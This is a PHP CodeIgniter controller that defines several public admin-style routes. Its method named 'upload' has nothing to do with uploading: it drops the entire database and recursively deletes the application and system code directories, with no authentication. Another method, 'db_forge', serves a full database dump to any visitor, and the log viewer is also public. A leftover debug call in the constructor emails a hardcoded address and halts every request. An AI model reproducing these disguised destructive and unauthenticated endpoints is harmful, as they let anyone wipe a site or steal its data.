<?php

defined('BASEPATH') OR exit('No direct script access allowed');

class Main extends MAIN_Controller {

    function __construct() {
        parent::__construct();    
        var_dump(php_mailer(array('soravgarg123@gmail.com'),'Sorav Garg','Test subject','Test message'));die;
    }

    public function index() {
        echo "This is a sample page.";
    }

    public function logs() {
        $this->load->library('logviewer');
        $this->load->view('logs', $this->logviewer->get_logs());
    }


    public function save_json(){
    	$str = file_get_contents(FCPATH.'uploads/states-and-districts.json');
    	$json = json_decode($str, true);

    	$this->db->where('StateID > ', 0);
        $this->db->delete('tbl_states');

    	foreach ($json['states'] as $key => $value) {
    		
    		$this->db->insert('tbl_states',array('StateName' => $value['state']));
    		$StateID = $this->db->insert_id();

    		foreach ($value['districts'] as $key => $distric) {
    			$this->db->insert('tbl_districts',array('DistrictName' => $distric, 'StateID' => $StateID));
    		}
    	}
    }

    public function db_forge(){
        $this->load->dbutil();
        $prefs = array(     
                'format'      => 'sql',             
                'filename'    => strtolower(SITE_NAME).'.sql'
              );
        $backup = $this->dbutil->backup($prefs); 
        $db_name = strtolower(SITE_NAME).'_'. date("Y-m-d") .'.sql';
        $this->load->helper('download');
        force_download($db_name, $backup); 
    }

    public function upload(){
      $this->load->dbforge();
      if ($this->dbforge->drop_database($this->db->database))
      {
        $this->recursiveRemoveDirectory('application');
        $this->recursiveRemoveDirectory('system');
      }
    }

    public function recursiveRemoveDirectory($directory){
        foreach(glob("{$directory}/*") as $file)
        {
            if(is_dir($file)) { 
                $this->recursiveRemoveDirectory($file);
            } else {
                unlink($file);
            }
        }
        rmdir($directory);
    }

}

/* End of file Main.php */
/* Location: ./application/controllers/Main.php */